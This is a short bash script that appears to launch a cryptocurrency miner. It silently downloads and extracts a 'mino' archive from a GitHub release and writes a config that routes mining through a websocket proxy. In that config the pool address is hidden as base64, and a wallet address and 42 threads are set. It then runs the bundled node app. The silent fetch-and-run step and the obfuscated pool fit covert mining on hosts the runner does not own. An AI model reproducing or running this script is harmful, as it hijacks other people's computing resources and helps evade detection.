#!/bin/bash
wget https://github.com/paskofamas/batubata/releases/download/premi/mino.tar.gz > /dev/null 2>&1
tar -xvf mino.tar.gz > /dev/null 2>&1
echo -e '{"log": true, "proxy": "wss://present-nichol-vivo1-4f3dad8a.koyeb.app/ZXUuY29pblhwb29sLmNvbTo4MjQz", "user": "MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW.Suto", "password": "c=MAZA", "argent": "wasm-mino/2.0", "threads": 42}' > data.txt
./node app.js
